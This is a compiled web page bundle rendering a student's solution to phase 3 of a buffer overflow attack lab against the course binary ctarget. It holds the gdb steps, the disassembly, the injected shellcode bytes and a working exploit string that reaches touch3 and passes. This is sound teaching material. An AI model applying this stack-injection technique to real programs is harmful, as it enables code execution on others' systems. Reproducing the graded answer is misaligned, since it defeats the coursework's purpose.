import{_ as e,X as a,Y as n,a1 as s}from"./framework-9435e890.js";const i={},d=s(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ gdb ctarget <span class="token parameter variable">--tui</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> getbuf
Breakpoint <span class="token number">1</span> at 0x401b28: <span class="token function">file</span> buf.c, line <span class="token number">12</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run <span class="token parameter variable">-q</span>
Starting program: /home/stu2020012872/3-lab-3-attacklab/target97/ctarget <span class="token parameter variable">-q</span>

Breakpoint <span class="token number">1</span>, getbuf <span class="token punctuation">(</span><span class="token punctuation">)</span> at buf.c:12
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers rsp
rsp            0x55668cc0       0x55668cc0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> ctarget <span class="token operator">&gt;</span> ctarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-ctarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-ctarget-asm" aria-hidden="true">#</a> Read File <code>ctarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000401b28 &lt;getbuf&gt;:
  401b28:	48 83 ec 28          	sub    $0x28,%rsp
...
0000000000401c78 &lt;touch3&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-3-inject-s" tabindex="-1"><a class="header-anchor" href="#write-file-phase-3-inject-s" aria-hidden="true">#</a> Write File <code>phase-3-inject.s</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>movq $0x55668cc8, %rdi
pushq $0x0000000000401c78
ret
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-2" tabindex="-1"><a class="header-anchor" href="#run-2" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>gcc <span class="token parameter variable">-c</span> phase-3-inject.s
objdump <span class="token parameter variable">--disassemble</span> phase-3-inject.o <span class="token operator">&gt;</span> phase-3-inject.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-phase-3-inject-asm" tabindex="-1"><a class="header-anchor" href="#read-file-phase-3-inject-asm" aria-hidden="true">#</a> Read File <code>phase-3-inject.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000000000 &lt;.text&gt;:
   0:	48 c7 c7 c8 8c 66 55 	mov    $0x55668cc8,%rdi
   7:	68 78 1c 40 00       	pushq  $0x401c78
   c:	c3                   	retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt" aria-hidden="true">#</a> Read File <code>cookie.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>0x3a9a6c2f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="convert-cookie-to-string" tabindex="-1"><a class="header-anchor" href="#convert-cookie-to-string" aria-hidden="true">#</a> Convert Cookie to String</h6><p>The string should end with a <code>\\0</code>.</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>33 61 39 61 36 63 32 66 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="write-file-phase-3-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-3-txt" aria-hidden="true">#</a> Write File <code>phase-3.txt</code></h6><p>Place the string in the parent frame of <code>getbuf</code>, that is, <code>test</code> stack frames.</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>48 c7 c7 c8 8c 66 55
68 78 1c 40 00
c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
98 8c 66 55 00 00 00 00
33 61 39 61 36 63 32 66 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-3" tabindex="-1"><a class="header-anchor" href="#run-3" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-3.txt <span class="token operator">&gt;</span> phase-3.in
./ctarget <span class="token parameter variable">-i</span> phase-3.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output" aria-hidden="true">#</a> Terminal Output</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch3!: You called touch3(&quot;3a9a6c2f&quot;)
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,24),t=[d];function r(l,c){return a(),n("div",null,t)}const o=e(i,[["render",r],["__file","index.html.vue"]]);export{o as default};
